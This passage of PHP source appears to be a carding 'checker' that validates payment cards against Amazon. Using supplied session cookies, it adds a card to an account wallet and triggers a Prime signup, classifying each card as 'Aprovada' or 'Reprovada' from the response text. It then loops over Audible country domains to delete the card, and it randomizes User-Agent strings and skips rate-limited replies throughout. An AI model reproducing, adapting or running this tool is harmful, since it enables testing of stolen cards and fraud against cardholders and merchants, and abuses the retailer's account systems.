$walletid2 = getstr($result, 'hidden\" name=\"ppw-widgetState\" value=\"','\"');

if ($walletid2 == null) {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al obtener walletid2. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning"></span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt_array($ch, [
CURLOPT_URL            => "https://www.$cookieUS1/payments-portal/data/widgets2/v1/customer/".$customerID."/continueWidget",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYPEER => false,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_COOKIE         => $cookie2,
CURLOPT_ENCODING       => "gzip",
CURLOPT_POSTFIELDS     => "ppw-jsEnabled=true&ppw-widgetState=".$walletid2."&ppw-widgetEvent=SavePaymentPreferenceEvent",
CURLOPT_HTTPHEADER     => array(
"Host: www.$cookieUS1",
$headers[] = "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS ".rand(10,99)."_1_2 like Mac OS X) AppleWebKit/".rand(100,999).".1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E".rand(100,999)." Safari/".rand(100,999).".1",
"content-type: application/x-www-form-urlencoded",
),
]);
$result = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$walletid = getstr($result, 'preferencePaymentMethodIds":"[\"','\"');

if ($walletid == null) {

die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error al obtener walletid2. </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning"></span><br>');

}

///////////////////////////////////////////////////////////////////////////////////////
 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.'.$cookieUS1.'/hp/wlp/pipeline/actions?redirectURL=L2dwL3ByaW1l&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&wlpLocation=prime_confirm&locationID=prime_confirm&primeCampaignId=SlashPrime&paymentMethodId='.$walletid.'&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet&cancelRedirectURL=Lw&paymentMethodIdList='.$walletid.'&location=prime_confirm&session-id='.$sessionds.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie2);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie2);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array();
$headers[] = 'Host: www.'.$cookieUS1.'';
$headers[] = 'Cookie: '.$cookie2.'';
$headers[] = 'Upgrade-Insecure-Requests: 1';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$Fim = curl_exec($ch);
curl_close($ch);

///////////////////////////////////////////////////////////////////////////////////////

$tokens = array(
    "audible.com",
    "audible.de",
    "audible.it",
    "audible.es",
    "audible.co.uk",
    "audible.com.au",
    "audible.ca",
    "audible.co.jp",
    "audible.fr"
);

///////////////////////////////////////////////////////////////////////////////////////

foreach ($tokens as $host1111) {

    $lastDotPosition = strrpos($host1111, '.');
    if ($lastDotPosition !== false) {
        $aftehost1111rLastDot = substr($host1111, $lastDotPosition + 1);
        if ($aftehost1111rLastDot === 'com') {
            $aftehost1111rLastDot = 'US';
        }
    }

    $cookie2 = convertCookie($cookieprim, strtoupper($aftehost1111rLastDot));

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => 'https://www.'.$host1111.'/account/payments?ref=',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_COOKIE         => $cookie2,
        CURLOPT_ENCODING       => "gzip",
        CURLOPT_POSTFIELDS     => "",
        CURLOPT_HEADER         => true,
        CURLOPT_HTTPHEADER     => array(
            'Host: www.'.$host1111,
            'sec-ch-ua: "Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'Upgrade-Insecure-Requests: 1',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Sec-GPC: 1',
            'Accept-Language: pt-BR,pt;q=0.9',
        ),
    ]);
    $r = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpcode == 429) {
        continue;
    }

    $csrf = getstr($r, 'data-csrf-token="', '"');
    if (stripos($csrf, '///')) {
        $c = getstr($r, 'data-payment-id="', 'payment-type');
        $csrf = getstr($c, 'data-csrf-token="', '"');
    }
    $address = getstr($r, 'data-billing-address-id="', '"');
    $cookie2 = convertCookie($cookieprim, strtoupper($aftehost1111rLastDot));

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => 'https://www.'.$host1111.'/unified-payment/deactivate-payment-instrument?requestUrl=https%3A%2F%2Fwww.'.$host1111.'%2Faccount%2Fpayments%3Fref%3D&relativeUrl=%2Faccount%2Fpayments&',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_COOKIE         => $cookie2,
        CURLOPT_ENCODING       => "gzip",
        CURLOPT_HEADER         => true,
        CURLOPT_POSTFIELDS     => "paymentId=".$payment."&billingAddressId=".$address."&paymentType=CreditCard&tail=0433&accountHolderName=Teste&csrfToken=".urlencode($csrf),
        CURLOPT_HTTPHEADER     => array(
            'Host: www.'.$host1111,
            'sec-ch-ua: "Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
            'Content-type: application/x-www-form-urlencoded',
            'X-Requested-With: XMLHttpRequest',
            'sec-ch-ua-mobile: ?0',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'sec-ch-ua-platform: "Windows"',
            'Accept: */*',
            'Sec-GPC: 1',
            'Accept-Language: pt-BR,pt;q=0.9',
            'Origin: https://www.'.$host1111,
            'Referer: https://www.'.$host1111.'/account/payments?ref=',
        ),
    ]);
    $r = curl_exec($ch);
    curl_close($ch);

    if (strpos($r, '"statusStringKey":"adbl_paymentswidget_delete_payment_success"')) {
        $msg = '✅';
        $err = "Removido: $msg $err1";
        break;
    } else {
        $msg = '❌';
        $err = "Removido: $msg $err1";
    }
}

///////////////////////////////////////////////////////////////////////////////////////

if (strpos($Fim, 'We’re sorry. We’re unable to complete your Prime signup at this time. Please try again later.')) { 

    die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-success"> Tarjeta verificada con exito. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning"></span><br>');

} elseif (strpos($Fim, 'Lo lamentamos. No podemos completar tu registro en Prime en este momento. Si aún sigues interesado en unirte a Prime, puedes registrarte durante el proceso de finalización de la compra.')) {

    die('<span class="text-success">Aprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-success"> Tarjeta verificada con exito. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning"></span><br>');

} elseif (strpos($Fim, 'InvalidInput')) {

    die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Transaccion Rechazada ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning"></span><br>');

} elseif(strpos($Fim, 'If you would still like to join Prime you can sign up during checkout')) {

    die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Limite de intentos. ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning"></span><br>');

} elseif (strpos($Fim, 'HARDVET_VERIFICATION_FAILED')) {

    die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Transaccion Rechazada ('.$err.') </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning"></span><br>');

} else {

    die('<span class="text-danger">Erros</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Error interno - Amazon API </span> ➔ Tiempo de respuesta: (' . (time() - $time) . 's) ➔ <span class="text-warning"></span><br>');

}

?>